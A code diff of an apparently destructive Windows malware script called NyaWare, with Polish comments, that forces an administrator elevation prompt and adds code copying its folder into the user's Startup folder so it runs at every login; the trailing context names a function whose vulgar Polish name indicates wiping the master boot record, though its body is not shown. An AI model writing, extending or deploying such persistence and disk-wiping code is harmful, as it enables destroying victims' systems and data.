@@ -9,11 +9,42 @@ import pygame
 import ctypes
 from win32file import *
 from plyer import notification
-
+import shutil
 
 if not ctypes.windll.shell32.IsUserAnAdmin():
     ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, ' '.join(sys.argv), None, 1)
     sys.exit()
+
+ 
+# Pobranie ścieżki do folderu, w którym znajduje się skrypt
+script_dir = os.path.dirname(os.path.abspath(__file__))
+ 
+# Ścieżka do folderu NyaWare względem skryptu
+source_folder = os.path.join(script_dir, 'NyaWare')
+ 
+# Ścieżka do folderu autostartu
+username = os.getlogin()  # Pobranie aktualnej nazwy użytkownika
+startup_folder = os.path.join(
+    os.environ['APPDATA'],
+    r'Microsoft\Windows\Start Menu\Programs\Startup'
+)
+ 
+def copy_folder_to_startup(source, destination):
+    # Jeśli folder docelowy nie istnieje, utwórz go
+    if not os.path.exists(destination):
+        os.makedirs(destination)
+ 
+    # Kopiowanie plików i folderów
+    for item in os.listdir(source):
+        s = os.path.join(source, item)
+        d = os.path.join(destination, item)
+        if os.path.isdir(s):
+            shutil.copytree(s, d, dirs_exist_ok=True)
+        else:
+            shutil.copy2(s, d)
+ 
+# Kopiowanie zawartości folderu NyaWare do folderu autostartu
+copy_folder_to_startup(source_folder, startup_folder)
 
     
 def rozpierdolMBR():
